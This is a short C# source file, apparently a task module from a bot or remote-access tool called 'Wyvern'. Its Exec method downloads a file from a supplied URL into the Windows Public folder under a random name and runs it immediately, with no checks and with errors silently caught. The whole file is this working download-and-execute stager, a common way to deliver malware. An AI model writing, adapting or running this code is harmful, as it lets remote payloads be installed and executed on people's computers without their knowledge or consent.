using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace Wyvern
{
    class Task
    {
        private string fileURL;

        public Task(string fileURL)
        {
            this.fileURL = fileURL;
        }

        private string RandomString(int _nLength)
        {
            var random = new Random((int)DateTime.Now.Ticks & 0x0000FFFF);
            var strPool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var chRandom = new char[_nLength];
            for (int i = 0; i < _nLength; i++)
            {
                chRandom[i] = strPool[random.Next(strPool.Length)];
            }
            var strRet = new String(chRandom);
            return strRet;
        }

        public void Exec()
        {
            try
            {
                var path = Environment.GetEnvironmentVariable("public") + "\\" + RandomString(8);
                var webClient = new WebClient();
                webClient.DownloadFile(fileURL, path);
                var processStartInfo = new ProcessStartInfo
                {
                    FileName = path,
                    UseShellExecute = false
                };
                Process.Start(processStartInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
